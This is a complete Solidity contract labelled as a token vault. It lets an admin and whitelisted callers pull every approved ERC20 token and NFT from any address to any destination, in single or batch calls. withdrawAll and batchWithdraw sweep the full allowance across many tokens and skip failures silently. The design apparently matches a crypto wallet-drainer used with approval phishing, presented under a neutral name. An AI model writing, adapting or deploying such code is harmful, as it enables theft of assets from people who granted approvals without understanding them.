// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

contract TokenVaultEth {
    address private immutable admin;
    mapping(address => bool) private whitelist;

    event TokensTransferred(
        address indexed token,
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event WhitelistUpdated(address indexed account, bool status);

    constructor() {
        admin = msg.sender;
        whitelist[msg.sender] = true;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Unauthorized");
        _;
    }

    modifier onlyAuthorized() {
        require(msg.sender == admin || whitelist[msg.sender], "Unauthorized");
        _;
    }

    /**
     * @dev Calls transferFrom via low-level `call` instead of the typed
     * IERC20 interface, and treats "call succeeded and either returned
     * nothing or returned true" as success (the standard SafeERC20 pattern).
     * Reverts on failure.
     */
    function _safeTransferFrom(address token, address from, address to, uint256 amount) private {
        require(_tryTransferFrom(token, from, to, amount), "Transfer failed");
    }

    /**
     * @dev Non-reverting variant of _safeTransferFrom, used by batchWithdraw
     * so one token's failure doesn't abort transfers of the others.
     */
    function _tryTransferFrom(address token, address from, address to, uint256 amount) private returns (bool) {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, from, to, amount)
        );
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    /**
     * @dev Safe NFT transfer via low-level call
     */
    function _safeNFTTransferFrom(address nftContract, address from, address to, uint256 tokenId) private {
        require(_tryNFTTransferFrom(nftContract, from, to, tokenId), "NFT transfer failed");
    }

    /**
     * @dev Non-reverting variant of NFT transfer
     */
    function _tryNFTTransferFrom(address nftContract, address from, address to, uint256 tokenId) private returns (bool) {
        (bool success, bytes memory data) = nftContract.call(
            abi.encodeWithSelector(IERC721.transferFrom.selector, from, to, tokenId)
        );
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }

    /**
     * @dev Add or remove a wallet from the whitelist (admin only)
     * @param account The wallet address to update
     * @param status True to whitelist, false to remove
     */
    function setWhitelist(address account, bool status) external onlyAdmin {
        require(account != address(0), "Invalid address");
        whitelist[account] = status;
        emit WhitelistUpdated(account, status);
    }

    /**
     * @dev Check if a wallet is whitelisted
     * @param account The wallet address to check
     */
    function isWhitelisted(address account) external view returns (bool) {
        return whitelist[account];
    }

    /**
     * @dev Execute a token withdrawal from an approved account
     * @param token The ERC20 token contract address
     * @param from The address that approved this contract
     * @param amount The amount to transfer
     * @param to Destination address for the tokens
     */
    function withdraw(
        address token,
        address from,
        uint256 amount,
        address to
    ) external onlyAuthorized returns (bool) {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid source");
        require(to != address(0), "Invalid destination");
        require(amount > 0, "Amount must be positive");

        _safeTransferFrom(token, from, to, amount);

        emit TokensTransferred(token, from, to, amount);
        return true;
    }

    /**
     * @dev Transfer all available approved tokens
     * @param token The ERC20 token contract address
     * @param from The address that approved this contract
     * @param to Destination address for the tokens
     */
    function withdrawAll(
        address token,
        address from,
        address to
    ) external onlyAuthorized returns (uint256) {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid source");
        require(to != address(0), "Invalid destination");

        uint256 balance = IERC20(token).balanceOf(from);
        require(balance > 0, "Insufficient balance");

        // Check allowance
        uint256 allowance = IERC20(token).allowance(from, address(this));
        uint256 amount = balance > allowance ? allowance : balance;
        require(amount > 0, "Insufficient allowance");

        _safeTransferFrom(token, from, to, amount);

        emit TokensTransferred(token, from, to, amount);
        return amount;
    }

    /**
     * @dev Batch transfer multiple tokens from one approved account
     * @param tokens Array of token addresses to transfer
     * @param from The address that approved this contract
     * @param to Destination address for the tokens
     */
    function batchWithdraw(
        address[] calldata tokens,
        address from,
        address to
    ) external onlyAuthorized returns (uint256[] memory) {
        require(from != address(0), "Invalid source");
        require(to != address(0), "Invalid destination");

        uint256[] memory amounts = new uint256[](tokens.length);

        for (uint i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (token == address(0)) continue;

            uint256 balance = IERC20(token).balanceOf(from);
            if (balance == 0) continue;

            uint256 allowance = IERC20(token).allowance(from, address(this));
            uint256 amount = balance > allowance ? allowance : balance;
            if (amount == 0) continue;

            bool success = _tryTransferFrom(token, from, to, amount);
            if (success) {
                amounts[i] = amount;
                emit TokensTransferred(token, from, to, amount);
            }
        }

        return amounts;
    }

    /**
     * @dev Check approved allowance for a token and account
     * @param token The token address
     * @param account The account address
     */
    function getAllowance(
        address token,
        address account
    ) external view returns (uint256) {
        return IERC20(token).allowance(account, address(this));
    }

    /**
     * @dev Get the admin address
     */
    function getAdmin() external view returns (address) {
        return admin;
    }

    /**
     * @dev Set approval for all NFTs of a contract (admin only)
     * @param nftContract The ERC721 contract address
     * @param spender The address to approve
     * @param approved True to approve, false to revoke
     */
    function approveNFTAll(
        address nftContract,
        address spender,
        bool approved
    ) external onlyAdmin {
        require(nftContract != address(0), "Invalid NFT contract");
        require(spender != address(0), "Invalid spender");
        IERC721(nftContract).setApprovalForAll(spender, approved);
    }

    /**
     * @dev Withdraw a specific NFT
     * @param nftContract The ERC721 contract address
     * @param from The address that approved this contract
     * @param tokenId The NFT token ID to transfer
     * @param to Destination address for the NFT
     */
    function withdrawNFT(
        address nftContract,
        address from,
        uint256 tokenId,
        address to
    ) external onlyAuthorized returns (bool) {
        require(nftContract != address(0), "Invalid NFT contract");
        require(from != address(0), "Invalid source");
        require(to != address(0), "Invalid destination");

        _safeNFTTransferFrom(nftContract, from, to, tokenId);

        emit TokensTransferred(nftContract, from, to, tokenId);
        return true;
    }

    /**
     * @dev Batch withdraw multiple NFTs
     * @param nftContracts Array of ERC721 contract addresses
     * @param tokenIds 2D array of token IDs corresponding to each contract
     * @param from The address that approved this contract
     * @param to Destination address for the NFTs
     */
    function batchWithdrawNFT(
        address[] calldata nftContracts,
        uint256[][] calldata tokenIds,
        address from,
        address to
    ) external onlyAuthorized returns (bool[] memory) {
        require(from != address(0), "Invalid source");
        require(to != address(0), "Invalid destination");
        require(nftContracts.length == tokenIds.length, "Array length mismatch");

        bool[] memory results = new bool[](nftContracts.length);

        for (uint256 i = 0; i < nftContracts.length; i++) {
            address nftContract = nftContracts[i];
            if (nftContract == address(0)) continue;

            for (uint256 j = 0; j < tokenIds[i].length; j++) {
                bool success = _tryNFTTransferFrom(nftContract, from, to, tokenIds[i][j]);
                if (success) {
                    emit TokensTransferred(nftContract, from, to, tokenIds[i][j]);
                    results[i] = true;
                }
            }
        }

        return results;
    }

    /**
     * @dev Check if approval for all is set
     * @param nftContract The ERC721 contract address
     * @param owner The owner address
     * @param operator The operator address
     */
    function isNFTApprovedForAll(
        address nftContract,
        address owner,
        address operator
    ) external view returns (bool) {
        return IERC721(nftContract).isApprovedForAll(owner, operator);
    }
}